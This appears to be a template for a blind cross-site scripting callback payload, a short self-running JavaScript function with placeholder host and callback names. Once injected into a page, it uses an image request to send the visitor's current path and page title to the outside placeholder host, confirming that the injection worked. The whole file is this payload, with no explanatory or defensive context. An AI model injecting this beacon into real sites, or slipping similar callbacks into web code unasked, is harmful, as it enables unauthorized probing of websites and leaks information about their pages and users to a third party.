(() => {
  if (window.__WINDOW_GUARD__) return;
  window.__WINDOW_GUARD__ = true;

  new Image().src =
    'http://__INTERACT_HOST__/__CALLBACK__' +
    '?p=' + encodeURIComponent(location.pathname) +
    '&t=' + encodeURIComponent(document.title);
})();
